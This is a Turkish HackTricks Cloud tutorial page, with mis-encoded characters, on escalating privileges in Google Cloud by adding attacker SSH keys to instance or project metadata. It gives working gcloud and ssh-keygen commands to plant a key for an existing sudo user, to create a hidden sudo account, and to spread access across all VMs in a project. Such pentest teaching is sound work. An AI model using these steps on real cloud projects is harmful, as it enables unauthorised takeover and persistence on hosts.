# GCP - Ã–zel SSH Metadata Ekle

## GCP - Ã–zel SSH Metadata Ekle

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

### Metadata'yÄ± DeÄŸiÅŸtirme <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Bir Ã¶rnekte metadata deÄŸiÅŸikliÄŸi, **bir saldÄ±rgan gerekli izinleri elde ederse Ã¶nemli gÃ¼venlik risklerine yol aÃ§abilir**.

#### **Ã–zel Metadata'ya SSH AnahtarlarÄ±nÄ±n Dahil Edilmesi**

GCP'de, **Linux sistemleri** genellikle [Google Compute Engine iÃ§in Python Linux Misafir OrtamÄ±](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) Ã¼zerinden betikler Ã§alÄ±ÅŸtÄ±rÄ±r. Bunun kritik bir bileÅŸeni, **yetkilendirilmiÅŸ SSH genel anahtarlarÄ±na** yÃ¶nelik gÃ¼ncellemeleri kontrol etmek iÃ§in Ã¶rnek metadata uÃ§ noktasÄ±nÄ± **dÃ¼zenli olarak kontrol eden** [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)dÄ±r.

Bu nedenle, bir saldÄ±rgan Ã¶zel metadata'yÄ± deÄŸiÅŸtirebilirse, daemon'un yeni bir genel anahtar bulmasÄ±nÄ± saÄŸlayabilir; bu anahtar iÅŸlenir ve **yerel sisteme entegre edilir**. Anahtar, **mevcut bir kullanÄ±cÄ±nÄ±n veya `sudo` ayrÄ±calÄ±klarÄ± olan yeni bir kullanÄ±cÄ±nÄ±n** `~/.ssh/authorized_keys` dosyasÄ±na eklenir; bu, anahtarÄ±n formatÄ±na baÄŸlÄ±dÄ±r. Ve saldÄ±rgan, ana bilgisayarÄ± tehlikeye atabilecektir.

#### **Mevcut ayrÄ±calÄ±klÄ± kullanÄ±cÄ±ya SSH anahtarÄ± ekleme**

1. **Ã–rnekteki Mevcut SSH AnahtarlarÄ±nÄ± Ä°nceleyin:**
*   Mevcut SSH anahtarlarÄ±nÄ± bulmak iÃ§in Ã¶rneÄŸi ve metadata'sÄ±nÄ± tanÄ±mlayan komutu Ã§alÄ±ÅŸtÄ±rÄ±n. Ã‡Ä±ktÄ±daki ilgili bÃ¶lÃ¼m `metadata` altÄ±nda, Ã¶zellikle `ssh-keys` anahtarÄ±nda olacaktÄ±r.

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
* SSH anahtarlarÄ±nÄ±n formatÄ±na dikkat edin: kullanÄ±cÄ± adÄ± anahtarÄ±n Ã¶nÃ¼nde, iki nokta ile ayrÄ±lmÄ±ÅŸtÄ±r.
2. **SSH AnahtarÄ± Metadata'sÄ± iÃ§in Bir Metin DosyasÄ± HazÄ±rlayÄ±n:**
* KullanÄ±cÄ± adlarÄ± ve bunlara karÅŸÄ±lÄ±k gelen SSH anahtarlarÄ±nÄ±n detaylarÄ±nÄ± `meta.txt` adlÄ± bir metin dosyasÄ±na kaydedin. Bu, mevcut anahtarlarÄ± korumak iÃ§in gereklidir.
3. **Hedef KullanÄ±cÄ± iÃ§in Yeni Bir SSH AnahtarÄ± OluÅŸturun (`alice` bu Ã¶rnekte):**
*   Yeni bir SSH anahtarÄ± oluÅŸturmak iÃ§in `ssh-keygen` komutunu kullanÄ±n; yorum alanÄ±nÄ±n (`-C`) hedef kullanÄ±cÄ± adÄ±yla eÅŸleÅŸtiÄŸinden emin olun.

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
* Yeni genel anahtarÄ± `meta.txt` dosyasÄ±na ekleyin, Ã¶rneÄŸin Ã¶rneÄŸin metadata'da bulunan formatÄ± taklit ederek.
4. **Ã–rneÄŸin SSH AnahtarÄ± Metadata'sÄ±nÄ± GÃ¼ncelleyin:**
*   GÃ¼ncellenmiÅŸ SSH anahtarÄ± metadata'sÄ±nÄ± `gcloud compute instances add-metadata` komutunu kullanarak Ã¶rneÄŸe uygulayÄ±n.

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
5. **Yeni SSH AnahtarÄ± ile Ã–rneÄŸe EriÅŸim SaÄŸlayÄ±n:**
*   Yeni anahtarÄ± kullanarak SSH ile Ã¶rneÄŸe baÄŸlanÄ±n ve hedef kullanÄ±cÄ± (`alice` bu Ã¶rnekte) baÄŸlamÄ±nda shell'e eriÅŸin.

```bash
ssh -i ./key alice@localhost
sudo id
```

#### **Yeni bir ayrÄ±calÄ±klÄ± kullanÄ±cÄ± oluÅŸturun ve bir SSH anahtarÄ± ekleyin**

EÄŸer ilginÃ§ bir kullanÄ±cÄ± bulunamazsa, `sudo` ayrÄ±calÄ±klarÄ± verilecek yeni bir kullanÄ±cÄ± oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
#### Proje dÃ¼zeyinde SSH anahtarlarÄ± <a href="#sshing-around" id="sshing-around"></a>

**Proje dÃ¼zeyinde SSH anahtarlarÄ± uygulayarak** bulut ortamÄ±nda birden fazla Sanal Makine (VM) iÃ§in SSH eriÅŸimini geniÅŸletmek mÃ¼mkÃ¼ndÃ¼r. Bu yaklaÅŸÄ±m, projede aÃ§Ä±kÃ§a proje genelinde SSH anahtarlarÄ±nÄ± engellemeyen herhangi bir Ã¶rneÄŸe SSH eriÅŸimi saÄŸlar. Ä°ÅŸte Ã¶zet bir kÄ±lavuz:

1. **Proje DÃ¼zeyinde SSH AnahtarlarÄ±nÄ± Uygula:**
*   `meta.txt` dosyasÄ±ndaki SSH anahtarlarÄ±nÄ± projenin meta verilerine eklemek iÃ§in `gcloud compute project-info add-metadata` komutunu kullanÄ±n. Bu iÅŸlem, SSH anahtarlarÄ±nÄ±n projedeki tÃ¼m VM'ler tarafÄ±ndan tanÄ±nmasÄ±nÄ± saÄŸlar, eÄŸer bir VM "Proje genelinde SSH anahtarlarÄ±nÄ± engelle" seÃ§eneÄŸini etkinleÅŸtirmemiÅŸse.

```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
2. **Proje Genel AnahtarlarÄ± Kullanarak Ã–rneklerine SSH BaÄŸlan:**
* Proje genelinde SSH anahtarlarÄ± mevcut olduÄŸunda, projedeki herhangi bir Ã¶rneÄŸe SSH ile baÄŸlanabilirsiniz. Proje genelinde anahtarlarÄ± engellemeyen Ã¶rnekler, SSH anahtarÄ±nÄ± kabul ederek eriÅŸim saÄŸlar.
* Bir Ã¶rneÄŸe SSH ile baÄŸlanmanÄ±n doÄŸrudan bir yÃ¶ntemi, `gcloud compute ssh [INSTANCE]` komutunu kullanmaktÄ±r. Bu komut, mevcut kullanÄ±cÄ± adÄ±nÄ±zÄ± ve proje dÃ¼zeyinde ayarlanan SSH anahtarlarÄ±nÄ± kullanarak eriÅŸim saÄŸlamaya Ã§alÄ±ÅŸÄ±r.

## Referanslar

* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
